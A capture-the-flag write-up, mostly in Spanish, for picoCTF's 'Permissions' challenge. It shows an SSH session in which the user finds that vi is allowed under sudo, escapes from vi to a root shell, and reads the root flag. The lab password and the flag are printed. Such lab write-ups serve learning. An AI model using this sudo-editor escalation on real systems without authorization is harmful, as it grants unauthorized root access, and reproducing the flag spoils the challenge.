## Descripción
Can you read files in the root file?

The system admin has provisioned an account for you on the main server:

`ssh -p 54440 [picoplayer@saturn.picoctf.net](mailto:picoplayer@saturn.picoctf.net)`

Password: `e3pn6lmvHt`

Can you login and read the root file?
## Solución
```
ReyLuis-academy@webshell:~$ ssh -p 54440 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.17.0-1019-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 29 20:36:44 2026 from 3.140.102.47
picoplayer@challenge:~$ sudo -l 
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi test
picoplayer@challenge:~$ sudo vi test

root@challenge:/home/picoplayer# whoiam
bash: whoiam: command not found
root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# ls
root@challenge:/home/picoplayer# cd ./
root@challenge:/home/picoplayer# ls -la
total 28
drwxr-xr-x 1 picoplayer picoplayer    58 Aug 29 20:48 .
drwxr-xr-x 1 root       root          24 Aug  4  2023 ..
-rw------- 1 picoplayer picoplayer    47 Aug 29 20:42 .bash_history
-rw-r--r-- 1 picoplayer picoplayer   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoplayer picoplayer  3771 Feb 25  2020 .bashrc
drwx------ 2 picoplayer picoplayer    34 Aug 29 20:36 .cache
-rw-r--r-- 1 picoplayer picoplayer   807 Feb 25  2020 .profile
-rw------- 1 root       root       12288 Aug 29 20:48 .test.swp
root@challenge:/home/picoplayer# cat .flag.txt
cat: .flag.txt: No such file or directory
root@challenge:/home/picoplayer# cat flag.txt
cat: flag.txt: No such file or directory
root@challenge:/home/picoplayer# cd /root/
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Aug 29 20:47 .
drwxr-xr-x 1 root root   63 Aug 29 20:35 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  994 Aug 29 20:47 .viminfo
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_f6ad392b}
```
Primero entramos a donde se nos indico luego con las pistas nos decía que permisos tengo y utilizamos sudo -l Lo que hizo que el programa nos sacara algunos comando que podríamos usar, Con los comandos entendimos que teníamos permiso de editor por lo que creamos nuestro archivo de prueba "test" y dentro usamos creo comandos de bin para obtener los permisos de root y con ello entrar a la carpeta de root buscar nuestro archivo y con cat leer la flag
## Notas adicionales

## Referencias
https://medium.com/@petemuiruri/permissions-writeup-picoctf-2023-be95c95f80a5